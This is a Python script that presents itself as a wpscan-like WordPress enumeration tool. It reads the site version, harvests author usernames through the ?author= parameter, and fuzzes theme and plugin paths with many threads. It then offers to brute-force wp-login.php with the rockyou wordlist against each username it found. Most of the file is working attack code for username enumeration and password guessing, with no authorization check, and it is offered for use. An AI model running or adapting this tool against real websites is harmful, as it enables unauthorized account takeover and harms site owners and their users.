import os 
import re
import requests
import concurrent.futures
import colorama
from colorama import Fore
colorama.init(autoreset=True)


"""
Created By: The_Architect
Last Updated: 04/20/23

Overview: This is a wordpress Tool i created for mapping wordpress websites.
The overall approach was to build a program like wpscan but with python3 using the requests library.

what this program maps.
----------------------
wordpress version
any authors aka usernames assocciated with the wp site
any themes in use
any plugins in use
and bruteforces the authors that are found with the rockyou wordlist to find valid credentials
 


This script requuires the rockyou.txt wordlist in utf8 format Please download the rockyou wordlist or copy it in the same directory as this program under
the name rockyou_utf8.txt
"""

print(Fore.CYAN+"""

╦ ╦┌─┐┌─┐┌─┐┌─┐┌┐┌┬┌─┐┌─┐┌┬┐  ╦ ╦┌─┐┬─┐┌┬┐╔═╗┬─┐┌─┐┌─┐┌─┐  ╔═╗┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐
║║║├┤ ├─┤├─┘│ │││││┌─┘├┤  ││  ║║║│ │├┬┘ ││╠═╝├┬┘├┤ └─┐└─┐  ╚═╗│  ├─┤││││││├┤ ├┬┘
╚╩╝└─┘┴ ┴┴  └─┘┘└┘┴└─┘└─┘─┴┘  ╚╩╝└─┘┴└──┴┘╩  ┴└─└─┘└─┘└─┘  ╚═╝└─┘┴ ┴┘└┘┘└┘└─┘┴└─

""")







ip = input("please enter the url to test: ") #the url to test
themelist = ("wp-themes.fuzz.txt")  # change to another wordlist if you like
pluginlist = ("wp-plugins.fuzz.txt") #change to another wordlist if you like

# Open wordlists and turn them into lists
with open(themelist) as f:
    themes = [word.strip() for word in f]
    f.close()
with open(pluginlist) as f:
    plugs = [word.strip() for word in f]
    f.close()

#get wordpress version
r = requests.get(ip)
r= r.text
print('\n')
result = re.findall(r'content="WordPress(.*?)"',r,re.DOTALL)[0]
print(Fore.CYAN+"Wordpress Version is "+Fore.RED+result)

#checking for authors on the wordpress site
def authors():
	print("\nFinding Authors")
	with open("authors.txt",'a') as f: 
		authors = ["1","2","3","4","5","6","7","8","9","10"]
		for i in range(len(authors)):
        		author = authors[i]
	        	url = ip+'/'+"?author=" + author
		        r = requests.get(url)
        		r = r.text
	        	result = re.findall(r'class="archive author author-(.*?)"',r,re.DOTALL)
	        	for res in result:
        	        	if "author=" in res:
                	        	pass
	                	else:
                                    print(Fore.CYAN+"Found Author "+Fore.RED+res.strip('\n').split("author")[0])
                                    f.write(res.split("author")[0]+"\n")
f.close()
authors()

# brute force wordpress themes.
print("\nChecking for Themes")
def themes_file(word):
    target = ip.strip('\n') + word
    r = requests.get(target)
    if r.status_code != 500: # check if status code is 500 cause thats what it response as
        pass
    else:
        r = requests.get(target.strip('\n')+"/style.css") # get the style.css file since it holds the version
        r = r.text
        result = re.findall(r'Version:(.*?)\n',r,re.DOTALL)
        print(Fore.CYAN+"Found Theme "+Fore.RED+word.split('/')[2],Fore.RED+"Version:"+result[0]) # print out the theme that was found and its version

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(themes_file, themes)




#brute force wordpress plugins
print("\nChecking for Plugins")
def plugins_file(word):
    target = ip.rstrip('/') + "/" + word.lstrip('/')
    r = requests.get(target)
    if r.status_code != 200: # check if status code is 200 cause thats what it response as
        pass
    else:
        r = requests.get(target.strip('\n')+"readme.txt") # get the readme file since it holds the version
        r = r.text
        result = re.findall(r'Stable tag:(.*?)\n',r,re.DOTALL) # usually the latest version that was installed is under stable tag
        print(Fore.CYAN+"Found Plugin "+Fore.RED+word.split('/')[2],Fore.RED+"Version:"+result[0]) # print out the plugin that was found and its version

with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(plugins_file, plugs)





contin = input("would you like to bruteforce the passwords for the authors we found? (y/n)")
if contin == 'y':
	#brute force authors with passwords
	print("\nchecking for valid username and password pairs")
	with open('authors.txt','r') as authors_file:
	        authors = [authors.strip() for authors in authors_file]
	        authors_file.close()


	with open('rockyou_utf8.txt','r') as password_file:
	        passwords = [passwords.strip() for passwords in password_file]
	        password_file.close()

	def passbrute(password):
	        url = ip+"wp-login.php"
	        for author in authors:
               		data = {'log':author,'pwd':password}
	                r = requests.post(url,data=data)
	                r = r.text
	                if "The password you entered for the username" not in r:
               		        print(Fore.CYAN+"Found Valid Credentials "+Fore.RED+f"{author}:{password} - Success ")
	                else:
               		        print(f"{author}:{password}",end='\r')

	with concurrent.futures.ThreadPoolExecutor() as executor:
	        executor.map(passbrute,passwords)

elif contin == 'n':
	print("Wordpress Enumeration Completed\nCleaning up files...")
	os.remove('authors.txt')
		

